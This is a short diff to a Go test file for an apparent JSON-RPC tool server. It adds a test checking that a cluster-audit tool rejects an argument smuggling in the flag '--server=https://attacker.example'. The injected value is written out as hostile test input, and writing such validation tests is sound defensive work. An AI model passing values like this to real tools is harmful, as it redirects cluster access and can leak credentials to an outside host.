@@ -43,3 +43,12 @@ func TestServer(t *testing.T) {
 		t.Errorf("unknown method: %s", lines[3])
 	}
 }
+
+func TestAuditToolRejectsFlagInjection(t *testing.T) {
+	in := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"audit_cluster_resource","arguments":{"resource":"deployments --server=https://attacker.example"}}}`
+	var out bytes.Buffer
+	(&Server{Version: "test"}).Serve(context.Background(), strings.NewReader(in), &out)
+	if !strings.Contains(out.String(), `"isError":true`) || !strings.Contains(out.String(), `invalid resource \"--server=https://attacker.example\"`) {
+		t.Errorf("unexpected response: %s", out.String())
+	}
+}
